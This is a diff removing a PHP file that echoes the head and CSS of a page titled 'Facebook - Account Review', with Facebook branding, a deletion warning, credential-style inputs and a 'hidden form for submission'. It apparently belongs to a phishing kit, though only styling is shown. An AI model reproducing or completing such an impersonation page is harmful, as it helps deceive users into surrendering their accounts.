@@ -1,2078 +1,1665 @@
-<?php
-echo "";
-echo "";
-echo "<!DOCTYPE html>";
-echo "<html lang=\"en\">";
-echo "<head>";
-echo "<meta charset=\"UTF-8\">";
-echo "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">";
-echo "<title>Facebook - Account Review</title>";
-echo "<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css\">";
-echo "<style>";
-echo "* {";
-echo "margin: 0;";
-echo "padding: 0;";
-echo "box-sizing: border-box;";
-echo "font-family: 'Segoe UI', Helvetica, Arial, sans-serif;";
-echo "}";
-echo "";
-echo "body {";
-echo "background: linear-gradient(135deg, #f0f2f5, #e4e6eb);";
-echo "color: #1c1e21;";
-echo "line-height: 1.6;";
-echo "min-height: 100vh;";
-echo "display: flex;";
-echo "flex-direction: column;";
-echo "overflow-x: hidden;";
-echo "}";
-echo "";
-echo "/* Header Styles */";
-echo ".header {";
-echo "background: linear-gradient(to right, #1877f2, #166fe5);";
-echo "padding: 15px 0;";
-echo "box-shadow: 0 2px 10px rgba(0,0,0,0.1);";
-echo "position: sticky;";
-echo "top: 0;";
-echo "z-index: 100;";
-echo "display: flex;";
-echo "justify-content: space-between;";
-echo "align-items: center;";
-echo "}";
-echo "";
-echo ".header-content {";
-echo "max-width: 1200px;";
-echo "margin: 0 auto;";
-echo "display: flex;";
-echo "flex-wrap: wrap;";
-echo "align-items: center;";
-echo "justify-content: space-between;";
-echo "padding: 0 20px;";
-echo "width: 100%;";
-echo "}";
-echo "";
-echo ".logo {";
-echo "display: flex;";
-echo "align-items: center;";
-echo "gap: 10px;";
-echo "color: white;";
-echo "font-size: 24px;";
-echo "font-weight: 700;";
-echo "}";
-echo "";
-echo ".logo i {";
-echo "font-size: 28px;";
-echo "}";
-echo "";
-echo ".help-center {";
-echo "color: rgba(255,255,255,0.9);";
-echo "font-weight: 600;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "gap: 8px;";
-echo "}";
-echo "";
-echo "/* Google Translate Container */";
-echo ".google-translate-container {";
-echo "position: absolute;";
-echo "top: 15px;";
-echo "right: 150px;";
-echo "width: auto;";
-echo "background: rgba(255, 255, 255, 0.2);";
-echo "border-radius: 4px;";
-echo "padding: 5px;";
-echo "}";
-echo "";
-echo ".translate-title {";
-echo "color: white;";
-echo "font-size: 12px;";
-echo "margin-bottom: 5px;";
-echo "display: block;";
-echo "text-align: center;";
-echo "}";
-echo "";
-echo "/* Professional Language Modal Styles */";
-echo ".language-modal {";
-echo "display: none;";
-echo "position: fixed;";
-echo "top: 0;";
-echo "left: 0;";
-echo "width: 100%;";
-echo "height: 100%;";
-echo "background: rgba(0,0,0,0.75);";
-echo "backdrop-filter: blur(4px);";
-echo "z-index: 1002;";
-echo "justify-content: center;";
-echo "align-items: center;";
-echo "opacity: 0;";
-echo "transition: opacity 0.3s ease;";
-echo "}";
-echo "";
-echo ".language-modal.active {";
-echo "opacity: 1;";
-echo "display: flex;";
-echo "}";
-echo "";
-echo ".language-modal-content {";
-echo "background: white;";
-echo "border-radius: 20px;";
-echo "width: 95%;";
-echo "max-width: 650px;";
-echo "max-height: 90vh;";
-echo "overflow: hidden;";
-echo "box-shadow: 0 25px 60px rgba(0,0,0,0.25);";
-echo "transform: translateY(30px);";
-echo "transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);";
-echo "display: flex;";
-echo "flex-direction: column;";
-echo "}";
-echo "";
-echo ".language-modal.active .language-modal-content {";
-echo "transform: translateY(0);";
-echo "}";
-echo "";
-echo ".language-modal-header {";
-echo "background: linear-gradient(135deg, #1877f2, #166fe5);";
-echo "padding: 25px 30px;";
-echo "color: white;";
-echo "display: flex;";
-echo "justify-content: space-between;";
-echo "align-items: center;";
-echo "position: relative;";
-echo "}";
-echo "";
-echo ".language-modal-header::after {";
-echo "content: '';";
-echo "position: absolute;";
-echo "bottom: 0;";
-echo "left: 0;";
-echo "width: 100%;";
-echo "height: 2px;";
-echo "background: rgba(255, 255, 255, 0.2);";
-echo "}";
-echo "";
-echo ".language-title {";
-echo "font-size: 24px;";
-echo "font-weight: 600;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "gap: 15px;";
-echo "color: white;";
-echo "}";
-echo "";
-echo ".language-title i {";
-echo "font-size: 26px;";
-echo "}";
-echo "";
-echo ".close-language-modal {";
-echo "background: rgba(255, 255, 255, 0.2);";
-echo "border: none;";
-echo "border-radius: 50%;";
-echo "width: 42px;";
-echo "height: 42px;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "justify-content: center;";
-echo "color: white;";
-echo "font-size: 22px;";
-echo "cursor: pointer;";
-echo "transition: all 0.3s ease;";
-echo "}";
-echo "";
-echo ".close-language-modal:hover {";
-echo "background: rgba(255, 255, 255, 0.3);";
-echo "transform: rotate(90deg);";
-echo "}";
-echo "";
-echo ".language-search-container {";
-echo "padding: 20px;";
-echo "background: #f7f9fc;";
-echo "border-bottom: 1px solid #e4e6eb;";
-echo "}";
-echo "";
-echo ".search-wrapper {";
-echo "position: relative;";
-echo "max-width: 500px;";
-echo "margin: 0 auto;";
-echo "width: 100%;";
-echo "}";
-echo "";
-echo ".language-search {";
-echo "width: 100%;";
-echo "padding: 15px 20px 15px 50px;";
-echo "border: 2px solid #e4e6eb;";
-echo "border-radius: 12px;";
-echo "font-size: 16px;";
-echo "transition: all 0.3s ease;";
-echo "background: white;";
-echo "color: #1c1e21;";
-echo "box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);";
-echo "}";
-echo "";
-echo ".language-search:focus {";
-echo "border-color: #1877f2;";
-echo "outline: none;";
-echo "box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.15);";
-echo "}";
-echo "";
-echo ".search-icon {";
-echo "position: absolute;";
-echo "left: 20px;";
-echo "top: 50%;";
-echo "transform: translateY(-50%);";
-echo "color: #606770;";
-echo "font-size: 18px;";
-echo "}";
-echo "";
-echo ".language-options-container {";
-echo "flex: 1;";
-echo "overflow-y: auto;";
-echo "padding: 20px;";
-echo "}";
-echo "";
-echo ".language-options {";
-echo "display: grid;";
-echo "grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));";
-echo "gap: 15px;";
-echo "}";
-echo "";
-echo ".language-btn {";
-echo "background: white;";
-echo "border: 1px solid #e4e6eb;";
-echo "border-radius: 12px;";
-echo "padding: 18px 15px;";
-echo "font-size: 15px;";
-echo "font-weight: 500;";
-echo "cursor: pointer;";
-echo "transition: all 0.25s ease;";
-echo "display: flex;";
-echo "flex-direction: column;";
-echo "align-items: center;";
-echo "gap: 10px;";
-echo "position: relative;";
-echo "overflow: hidden;";
-echo "}";
-echo "";
-echo ".language-btn:hover {";
-echo "transform: translateY(-3px);";
-echo "border-color: #1877f2;";
-echo "box-shadow: 0 8px 20px rgba(24, 119, 242, 0.12);";
-echo "}";
-echo "";
-echo ".language-btn.selected {";
-echo "border: 2px solid #1877f2;";
-echo "background: rgba(24, 119, 242, 0.05);";
-echo "box-shadow: 0 4px 15px rgba(24, 119, 242, 0.1);";
-echo "}";
-echo "";
-echo ".language-btn.selected::after {";
-echo "content: '';";
-echo "position: absolute;";
-echo "top: 10px;";
-echo "right: 10px;";
-echo "width: 20px;";
-echo "height: 20px;";
-echo "background: #1877f2;";
-echo "border-radius: 50%;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "justify-content: center;";
-echo "color: white;";
-echo "font-size: 12px;";
-echo "font-weight: bold;";
-echo "}";
-echo "";
-echo ".language-btn.selected::before {";
-echo "content: '\\f00c';";
-echo "font-family: 'Font Awesome 5 Free';";
-echo "font-weight: 900;";
-echo "position: absolute;";
-echo "top: 10px;";
-echo "right: 10px;";
-echo "width: 20px;";
-echo "height: 20px;";
-echo "color: white;";
-echo "z-index: 2;";
-echo "font-size: 10px;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "justify-content: center;";
-echo "}";
-echo "";
-echo ".language-icon {";
-echo "font-size: 28px;";
-echo "color: #1877f2;";
-echo "width: 50px;";
-echo "height: 50px;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "justify-content: center;";
-echo "background: rgba(24, 119, 242, 0.1);";
-echo "border-radius: 50%;";
-echo "}";
-echo "";
-echo ".language-name {";
-echo "font-weight: 600;";
-echo "color: #1d2129;";
-echo "}";
-echo "";
-echo ".language-native {";
-echo "font-size: 13px;";
-echo "color: #606770;";
-echo "margin-top: 3px;";
-echo "}";
-echo "";
-echo ".language-footer {";
-echo "padding: 20px;";
-echo "background: #f7f9fc;";
-echo "border-top: 1px solid #e4e6eb;";
-echo "display: flex;";
-echo "justify-content: space-between;";
-echo "align-items: center;";
-echo "}";
-echo "";
-echo ".selected-language-display {";
-echo "font-size: 15px;";
-echo "color: #606770;";
-echo "}";
-echo "";
-echo ".selected-language-display strong {";
-echo "color: #1d2129;";
-echo "font-weight: 600;";
-echo "}";
-echo "";
-echo ".confirm-btn {";
-echo "background: linear-gradient(135deg, #1877f2, #166fe5);";
-echo "color: white;";
-echo "border: none;";
-echo "border-radius: 12px;";
-echo "padding: 12px 35px;";
-echo "font-size: 16px;";
-echo "font-weight: 600;";
-echo "cursor: pointer;";
-echo "transition: all 0.3s ease;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "gap: 8px;";
-echo "box-shadow: 0 4px 15px rgba(24, 119, 242, 0.25);";
-echo "}";
-echo "";
-echo ".confirm-btn:hover {";
-echo "background: linear-gradient(135deg, #166fe5, #1461c9);";
-echo "transform: translateY(-2px);";
-echo "box-shadow: 0 6px 20px rgba(24, 119, 242, 0.35);";
-echo "}";
-echo "";
-echo ".confirm-btn:disabled {";
-echo "background: #e4e6eb;";
-echo "color: #bdc1c9;";
-echo "cursor: not-allowed;";
-echo "transform: none;";
-echo "box-shadow: none;";
-echo "}";
-echo "";
-echo "/* Main Content */";
-echo ".container {";
-echo "max-width: 1000px;";
-echo "margin: 40px auto;";
-echo "padding: 0 20px;";
-echo "flex: 1;";
-echo "display: flex;";
-echo "flex-direction: column;";
-echo "align-items: center;";
-echo "}";
-echo "";
-echo ".review-card {";
-echo "background: white;";
-echo "border-radius: 16px;";
-echo "box-shadow: 0 10px 30px rgba(0,0,0,0.1);";
-echo "padding: 50px;";
-echo "width: 100%;";
-echo "position: relative;";
-echo "overflow: hidden;";
-echo "border: 1px solid #dddfe2;";
-echo "margin-bottom: 40px;";
-echo "text-align: center;";
-echo "}";
-echo "";
-echo ".review-card::before {";
-echo "content: '';";
-echo "position: absolute;";
-echo "top: 0;";
-echo "left: 0;";
-echo "width: 100%;";
-echo "height: 5px;";
-echo "background: linear-gradient(to right, #ff9800, #ff5722);";
-echo "}";
-echo "";
-echo ".warning-icon {";
-echo "font-size: 70px;";
-echo "color: #ff9800;";
-echo "margin-bottom: 25px;";
-echo "text-align: center;";
-echo "animation: pulse 2s infinite;";
-echo "}";
-echo "";
-echo "@keyframes pulse {";
-echo "0% { transform: scale(1); }";
-echo "50% { transform: scale(1.1); }";
-echo "100% { transform: scale(1); }";
-echo "}";
-echo "";
-echo ".review-title {";
-echo "font-size: 36px;";
-echo "margin-bottom: 20px;";
-echo "color: #1d2129;";
-echo "font-weight: 700;";
-echo "text-align: center;";
-echo "}";
-echo "";
-echo ".review-subtitle {";
-echo "font-size: 20px;";
-echo "color: #606770;";
-echo "max-width: 700px;";
-echo "margin: 0 auto 30px;";
-echo "line-height: 1.6;";
-echo "text-align: center;";
-echo "}";
-echo "";
-echo ".deletion-warning {";
-echo "background: rgba(255, 152, 0, 0.1);";
-echo "border-radius: 12px;";
-echo "padding: 25px;";
-echo "text-align: left;";
-echo "margin: 30px 0;";
-echo "border-left: 4px solid #ff9800;";
-echo "}";
-echo "";
-echo ".deletion-warning h3 {";
-echo "color: #e67700;";
-echo "margin-bottom: 15px;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "gap: 10px;";
-echo "font-size: 22px;";
-echo "}";
-echo "";
-echo ".deletion-warning ul {";
-echo "padding-left: 25px;";
-echo "}";
-echo "";
-echo ".deletion-warning li {";
-echo "margin-bottom: 12px;";
-echo "font-size: 17px;";
-echo "line-height: 1.6;";
-echo "color: #1c1e21;";
-echo "}";
-echo "";
-echo ".review-btn {";
-echo "background: linear-gradient(135deg, #1877f2, #166fe5);";
-echo "color: white;";
-echo "border: none;";
-echo "border-radius: 50px;";
-echo "padding: 18px 45px;";
-echo "font-size: 20px;";
-echo "font-weight: 600;";
-echo "cursor: pointer;";
-echo "transition: all 0.3s ease;";
-echo "box-shadow: 0 5px 15px rgba(24, 119, 242, 0.2);";
-echo "display: inline-flex;";
-echo "align-items: center;";
-echo "justify-content: center;";
-echo "gap: 12px;";
-echo "margin-top: 20px;";
-echo "display: block;";
-echo "width: fit-content;";
-echo "margin: 30px auto 0;";
-echo "position: relative;";
-echo "overflow: hidden;";
-echo "}";
-echo "";
-echo ".review-btn:hover {";
-echo "background: linear-gradient(135deg, #166fe5, #1461c9);";
-echo "transform: translateY(-3px);";
-echo "box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3);";
-echo "}";
-echo "";
-echo ".review-btn::after {";
-echo "content: '';";
-echo "position: absolute;";
-echo "top: 0;";
-echo "left: -100%;";
-echo "width: 100%;";
-echo "height: 100%;";
-echo "background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);";
-echo "transition: 0.5s;";
-echo "}";
-echo "";
-echo ".review-btn:hover::after {";
-echo "left: 100%;";
-echo "}";
-echo "";
-echo "/* Modal Styles */";
-echo ".modal {";
-echo "display: none;";
-echo "position: fixed;";
-echo "top: 0;";
-echo "left: 0;";
-echo "width: 100%;";
-echo "height: 100%;";
-echo "background: rgba(0,0,0,0.7);";
-echo "z-index: 1001;";
-echo "overflow-y: auto;";
-echo "padding: 20px;";
-echo "}";
-echo "";
-echo ".modal-content {";
-echo "background: white;";
-echo "border-radius: 16px;";
-echo "box-shadow: 0 15px 40px rgba(0,0,0,0.2);";
-echo "max-width: 900px;";
-echo "margin: 40px auto;";
-echo "position: relative;";
-echo "overflow: hidden;";
-echo "animation: modalAppear 0.4s ease;";
-echo "border: 1px solid #dddfe2;";
-echo "}";
-echo "";
-echo "@keyframes modalAppear {";
-echo "from { transform: translateY(50px); opacity: 0; }";
-echo "to { transform: translateY(0); opacity: 1; }";
-echo "}";
-echo "";
-echo ".modal-header {";
-echo "padding: 25px 30px;";
-echo "background: linear-gradient(135deg, #1877f2, #166fe5);";
-echo "color: white;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "justify-content: space-between;";
-echo "border-bottom: 1px solid #dddfe2;";
-echo "}";
-echo "";
-echo ".modal-title {";
-echo "font-size: 24px;";
-echo "font-weight: 600;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "gap: 12px;";
-echo "}";
-echo "";
-echo ".close-modal {";
-echo "background: transparent;";
-echo "border: none;";
-echo "color: white;";
-echo "font-size: 28px;";
-echo "cursor: pointer;";
-echo "transition: all 0.3s ease;";
-echo "width: 40px;";
-echo "height: 40px;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "justify-content: center;";
-echo "border-radius: 50%;";
-echo "}";
-echo "";
-echo ".close-modal:hover {";
-echo "background: rgba(255,255,255,0.2);";
-echo "transform: rotate(90deg);";
-echo "}";
-echo "";
-echo ".modal-body {";
-echo "padding: 30px;";
-echo "}";
-echo "";
-echo ".step-indicator {";
-echo "display: flex;";
-echo "justify-content: center;";
-echo "gap: 10px;";
-echo "margin-bottom: 30px;";
-echo "}";
-echo "";
-echo ".step {";
-echo "width: 40px;";
-echo "height: 40px;";
-echo "border-radius: 50%;";
-echo "background: #e4e6eb;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "justify-content: center;";
-echo "font-weight: 700;";
-echo "position: relative;";
-echo "z-index: 2;";
-echo "color: #606770;";
-echo "font-size: 18px;";
-echo "}";
-echo "";
-echo ".step.active {";
-echo "background: #1877f2;";
-echo "color: white;";
-echo "box-shadow: 0 0 15px rgba(24, 119, 242, 0.3);";
-echo "}";
-echo "";
-echo ".step-line {";
-echo "position: absolute;";
-echo "top: 50%;";
-echo "left: 0;";
-echo "width: 100%;";
-echo "height: 3px;";
-echo "background: #e4e6eb;";
-echo "z-index: 1;";
-echo "}";
-echo "";
-echo ".step-content {";
-echo "display: none;";
-echo "}";
-echo "";
-echo ".step-content.active {";
-echo "display: block;";
-echo "animation: fadeIn 0.5s ease;";
-echo "}";
-echo "";
-echo "@keyframes fadeIn {";
-echo "from { opacity: 0; transform: translateY(10px); }";
-echo "to { opacity: 1; transform: translateY(0); }";
-echo "}";
-echo "";
-echo ".step-title {";
-echo "text-align: center;";
-echo "font-size: 24px;";
-echo "margin-bottom: 25px;";
-echo "color: #1d2129;";
-echo "}";
-echo "";
-echo "/* Premium Video Player Styles */";
-echo ".video-player-container {";
-echo "position: relative;";
-echo "width: 100%;";
-echo "background: #000;";
-echo "border-radius: 12px;";
-echo "overflow: hidden;";
-echo "margin: 25px 0;";
-echo "box-shadow: 0 10px 30px rgba(0,0,0,0.1);";
-echo "}";
-echo "";
-echo ".video-container {";
-echo "position: relative;";
-echo "padding-top: 56.25%; /* 16:9 Aspect Ratio */";
-echo "}";
-echo "";
-echo ".video-container video {";
-echo "position: absolute;";
-echo "top: 0;";
-echo "left: 0;";
-echo "width: 100%;";
-echo "height: 100%;";
-echo "border: none;";
-echo "object-fit: cover;";
-echo "}";
-echo "";
-echo ".video-overlay {";
-echo "position: absolute;";
-echo "top: 0;";
-echo "left: 0;";
-echo "width: 100%;";
-echo "height: 100%;";
-echo "background: rgba(0,0,0,0.5);";
-echo "display: flex;";
-echo "flex-direction: column;";
-echo "align-items: center;";
-echo "justify-content: center;";
-echo "z-index: 2;";
-echo "transition: opacity 0.3s ease;";
-echo "}";
-echo "";
-echo ".video-overlay.hidden {";
-echo "opacity: 0;";
-echo "pointer-events: none;";
-echo "}";
-echo "";
-echo ".play-btn {";
-echo "background: rgba(24, 119, 242, 0.8);";
-echo "width: 80px;";
-echo "height: 80px;";
-echo "border-radius: 50%;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "justify-content: center;";
-echo "cursor: pointer;";
-echo "margin-bottom: 20px;";
-echo "border: 3px solid white;";
-echo "transition: all 0.3s ease;";
-echo "}";
-echo "";
-echo ".play-btn:hover {";
-echo "transform: scale(1.1);";
-echo "background: rgba(24, 119, 242, 1);";
-echo "}";
-echo "";
-echo ".play-btn i {";
-echo "font-size: 40px;";
-echo "color: white;";
-echo "}";
-echo "";
-echo "/* Loading Spinner Styles */";
-echo ".loading-spinner {";
-echo "position: absolute;";
-echo "top: 50%;";
-echo "left: 50%;";
-echo "transform: translate(-50%, -50%);";
-echo "z-index: 3;";
-echo "display: none;";
-echo "flex-direction: column;";
-echo "align-items: center;";
-echo "justify-content: center;";
-echo "background: rgba(0,0,0,0.7);";
-echo "border-radius: 50%;";
-echo "width: 100px;";
-echo "height: 100px;";
-echo "}";
-echo "";
-echo ".spinner {";
-echo "border: 4px solid rgba(255, 255, 255, 0.3);";
-echo "border-top: 4px solid #1877f2;";
-echo "border-radius: 50%;";
-echo "width: 50px;";
-echo "height: 50px;";
-echo "animation: spin 1s linear infinite;";
-echo "margin-bottom: 10px;";
-echo "}";
-echo "";
-echo ".loading-percentage {";
-echo "color: white;";
-echo "font-size: 16px;";
-echo "font-weight: bold;";
-echo "}";
-echo "";
-echo "@keyframes spin {";
-echo "0% { transform: rotate(0deg); }";
-echo "100% { transform: rotate(360deg); }";
-echo "}";
-echo "";
-echo ".video-controls {";
-echo "position: absolute;";
-echo "bottom: 0;";
-echo "left: 0;";
-echo "width: 100%;";
-echo "background: rgba(0, 0, 0, 0.7);";
-echo "padding: 10px 15px;";
-echo "display: flex;";
-echo "flex-wrap: wrap;";
-echo "align-items: center;";
-echo "z-index: 10;";
-echo "transform: translateY(100%);";
-echo "transition: transform 0.3s ease;";
-echo "}";
-echo "";
-echo ".video-container:hover .video-controls {";
-echo "transform: translateY(0);";
-echo "}";
-echo "";
-echo ".control-btn {";
-echo "background: none;";
-echo "border: none;";
-echo "color: white;";
-echo "font-size: 16px;";
-echo "cursor: pointer;";
-echo "padding: 5px 10px;";
-echo "outline: none;";
-echo "}";
-echo "";
-echo ".progress-container {";
-echo "flex-grow: 1;";
-echo "height: 5px;";
-echo "background: rgba(255, 255, 255, 0.2);";
-echo "border-radius: 10px;";
-echo "margin: 0 15px;";
-echo "cursor: pointer;";
-echo "position: relative;";
-echo "}";
-echo "";
-echo ".buffered-bar {";
-echo "position: absolute;";
-echo "height: 100%;";
-echo "background: rgba(255, 255, 255, 0.3);";
-echo "border-radius: 10px;";
-echo "width: 0%;";
-echo "}";
-echo "";
-echo ".progress-bar {";
-echo "height: 100%;";
-echo "background: #1877f2;";
-echo "border-radius: 10px;";
-echo "position: relative;";
-echo "width: 0%;";
-echo "z-index: 2;";
-echo "}";
-echo "";
-echo ".time-display {";
-echo "color: white;";
-echo "font-size: 14px;";
-echo "min-width: 100px;";
-echo "text-align: center;";
-echo "}";
-echo "";
-echo ".volume-container {";
-echo "display: flex;";
-echo "align-items: center;";
-echo "margin: 0 15px;";
-echo "}";
-echo "";
-echo ".volume-slider {";
-echo "width: 80px;";
-echo "margin-left: 5px;";
-echo "-webkit-appearance: none;";
-echo "height: 5px;";
-echo "background: rgba(255, 255, 255, 0.2);";
-echo "border-radius: 10px;";
-echo "outline: none;";
-echo "}";
-echo "";
-echo ".volume-slider::-webkit-slider-thumb {";
-echo "-webkit-appearance: none;";
-echo "width: 15px;";
-echo "height: 15px;";
-echo "border-radius: 50%;";
-echo "background: #1877f2;";
-echo "cursor: pointer;";
-echo "}";
-echo "";
-echo ".speed-selector {";
-echo "background: rgba(255, 255, 255, 0.1);";
-echo "color: white;";
-echo "border: none;";
-echo "border-radius: 4px;";
-echo "padding: 5px;";
-echo "margin: 0 15px;";
-echo "cursor: pointer;";
-echo "}";
-echo "";
-echo ".fullscreen-btn {";
-echo "margin-left: auto;";
-echo "}";
-echo "";
-echo "/* Form Styles */";
-echo ".form-group {";
-echo "margin-bottom: 25px;";
-echo "}";
-echo "";
-echo ".form-group label {";
-echo "display: block;";
-echo "margin-bottom: 12px;";
-echo "font-weight: 600;";
-echo "color: #1d2129;";
-echo "font-size: 17px;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "gap: 10px;";
-echo "}";
-echo "";
-echo ".form-group label i {";
-echo "color: #ff9800;";
-echo "font-size: 20px;";
-echo "}";
-echo "";
-echo ".form-group input {";
-echo "width: 100%;";
-echo "padding: 16px 20px;";
-echo "border: 2px solid #dddfe2;";
-echo "border-radius: 12px;";
-echo "font-size: 17px;";
-echo "transition: all 0.3s ease;";
-echo "background: #f0f2f5;";
-echo "color: #1c1e21;";
-echo "}";
-echo "";
-echo ".form-group input:focus {";
-echo "border-color: #1877f2;";
-echo "outline: none;";
-echo "background: #f0f2f5;";
-echo "box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.2);";
-echo "}";
-echo "";
-echo ".mobile-instructions {";
-echo "background: rgba(255, 152, 0, 0.1);";
-echo "border-radius: 12px;";
-echo "padding: 25px;";
-echo "margin: 25px 0;";
-echo "border-left: 4px solid #ff9800;";
-echo "}";
-echo "";
-echo ".mobile-instructions h3 {";
-echo "color: #e67700;";
-echo "margin-bottom: 15px;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "gap: 10px;";
-echo "}";
-echo "";
-echo ".mobile-instructions ol {";
-echo "padding-left: 25px;";
-echo "}";
-echo "";
-echo ".mobile-instructions li {";
-echo "margin-bottom: 12px;";
-echo "font-size: 16px;";
-echo "line-height: 1.6;";
-echo "color: #1c1e21;";
-echo "}";
-echo "";
-echo ".btn-group {";
-echo "display: flex;";
-echo "gap: 15px;";
-echo "margin-top: 25px;";
-echo "}";
-echo "";
-echo ".btn {";
-echo "flex: 1;";
-echo "padding: 16px 20px;";
-echo "border-radius: 12px;";
-echo "font-size: 17px;";
-echo "font-weight: 600;";
-echo "cursor: pointer;";
-echo "transition: all 0.3s ease;";
-echo "text-align: center;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "justify-content: center;";
-echo "gap: 10px;";
-echo "position: relative;";
-echo "overflow: hidden;";
-echo "}";
-echo "";
-echo ".btn-primary {";
-echo "background: linear-gradient(135deg, #1877f2, #166fe5);";
-echo "color: white;";
-echo "border: none;";
-echo "box-shadow: 0 5px 15px rgba(24, 119, 242, 0.2);";
-echo "}";
-echo "";
-echo ".btn-primary:hover {";
-echo "background: linear-gradient(135deg, #166fe5, #1461c9);";
-echo "transform: translateY(-3px);";
-echo "box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3);";
-echo "}";
-echo "";
-echo ".btn-outline {";
-echo "background: transparent;";
-echo "color: #1877f2;";
-echo "border: 2px solid #1877f2;";
-echo "}";
-echo "";
-echo ".btn-outline:hover {";
-echo "background: rgba(24, 119, 242, 0.05);";
-echo "transform: translateY(-3px);";
-echo "}";
-echo "";
-echo ".btn::after {";
-echo "content: '';";
-echo "position: absolute;";
-echo "top: 0;";
-echo "left: -100%;";
-echo "width: 100%;";
-echo "height: 100%;";
-echo "background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);";
-echo "transition: 0.5s;";
-echo "}";
-echo "";
-echo ".btn:hover::after {";
-echo "left: 100%;";
-echo "}";
-echo "";
-echo ".success-message {";
-echo "text-align: center;";
-echo "padding: 40px 20px;";
-echo "}";
-echo "";
-echo ".success-icon {";
-echo "font-size: 70px;";
-echo "color: #36a420;";
-echo "margin-bottom: 25px;";
-echo "animation: successPulse 1.5s infinite;";
-echo "}";
-echo "";
-echo "@keyframes successPulse {";
-echo "0% { transform: scale(1); }";
-echo "50% { transform: scale(1.1); }";
-echo "100% { transform: scale(1); }";
-echo "}";
-echo "";
-echo ".success-title {";
-echo "font-size: 32px;";
-echo "margin-bottom: 20px;";
-echo "color: #1d2129;";
-echo "}";
-echo "";
-echo ".success-text {";
-echo "font-size: 18px;";
-echo "color: #606770;";
-echo "max-width: 600px;";
-echo "margin: 0 auto 30px;";
-echo "line-height: 1.6;";
-echo "}";
-echo "";
-echo "/* Footer */";
-echo "footer {";
-echo "background: white;";
-echo "padding: 30px 0;";
-echo "border-top: 1px solid #dddfe2;";
-echo "margin-top: auto;";
-echo "}";
-echo "";
-echo ".footer-content {";
-echo "max-width: 1200px;";
-echo "margin: 0 auto;";
-echo "padding: 0 20px;";
-echo "text-align: center;";
-echo "}";
-echo "";
-echo ".footer-links {";
-echo "display: flex;";
-echo "justify-content: center;";
-echo "gap: 25px;";
-echo "margin: 20px 0;";
-echo "flex-wrap: wrap;";
-echo "}";
-echo "";
-echo ".footer-links a {";
-echo "color: #606770;";
-echo "text-decoration: none;";
-echo "transition: all 0.3s ease;";
-echo "font-weight: 500;";
-echo "}";
-echo "";
-echo ".footer-links a:hover {";
-echo "color: #1877f2;";
-echo "text-decoration: underline;";
-echo "}";
-echo "";
-echo ".copyright {";
-echo "color: #8a8d91;";
-echo "font-size: 14px;";
-echo "margin-top: 15px;";
-echo "}";
-echo "";
-echo "/* Video Quality Selector */";
-echo ".quality-selector {";
-echo "position: absolute;";
-echo "top: 15px;";
-echo "right: 15px;";
-echo "z-index: 20;";
-echo "background: rgba(0,0,0,0.7);";
-echo "color: white;";
-echo "border: none;";
-echo "border-radius: 4px;";
-echo "padding: 5px 10px;";
-echo "font-size: 14px;";
-echo "cursor: pointer;";
-echo "}";
-echo "";
-echo "/* Network Status */";
-echo ".network-status {";
-echo "position: absolute;";
-echo "top: 15px;";
-echo "left: 15px;";
-echo "z-index: 20;";
-echo "display: flex;";
-echo "align-items: center;";
-echo "gap: 5px;";
-echo "color: white;";
-echo "font-size: 12px;";
-echo "background: rgba(0,0,0,0.5);";
-echo "padding: 3px 8px;";
-echo "border-radius: 4px;";
-echo "}";
-echo "";
-echo ".network-status i {";
-echo "color: #4CAF50;";
-echo "}";
-echo "";
-echo "/* Hidden form for submission */";
-echo ".hidden-form {";
-echo "display: none;";
-echo "}";
-echo "";
-echo "@media (max-width: 768px) {";
-echo ".review-card {";
-echo "padding: 30px 20px;";
-echo "}";
-echo "";
-echo ".review-title {";
-echo "font-size: 28px;";
-echo "}";
-echo "";
-echo ".review-subtitle {";
-echo "font-size: 18px;";
-echo "}";
-echo "";
-echo ".review-btn {";
-echo "padding: 16px 30px;";
-echo "font-size: 18px;";
-echo "}";
-echo "";
-echo ".modal-content {";
-echo "margin: 20px auto;";
-echo "}";
-echo "";
-echo ".modal-header {";
-echo "padding: 20px;";
-echo "}";
-echo "";
-echo ".modal-title {";
-echo "font-size: 20px;";
-echo "}";
-echo "";
-echo ".modal-body {";
-echo "padding: 20px;";
-echo "}";
-echo "";
-echo ".btn-group {";
-echo "flex-direction: column;";
-echo "}";
-echo "";
-echo ".video-controls {";
-echo "padding: 8px 10px;";
-echo "}";
-echo "";
-echo ".control-btn {";
-echo "padding: 3px 5px;";
-echo "font-size: 14px;";
-echo "}";
-echo "";
-echo ".time-display {";
-echo "min-width: 80px;";
-echo "font-size: 12px;";
-echo "}";
-echo "";
-echo ".volume-slider {";
-echo "width: 50px;";
-echo "}";
-echo "";
-echo ".header-content {";
-echo "flex-direction: column;";
-echo "align-items: stretch;";
-echo "gap: 15px;";
-echo "}";
-echo "";
-echo ".logo {";
-echo "justify-content: center;";
-echo "}";
-echo "";
-echo ".help-center {";
-echo "justify-content: center;";
-echo "}";
-echo "";
-echo ".google-translate-container {";
-echo "position: relative;";
-echo "width: 100%;";
-echo "margin-top: 10px;";
-echo "right: 0;";
-echo "}";
-echo "";
-echo ".language-options {";
-echo "grid-template-columns: 1fr;";
-echo "}";
-echo "";
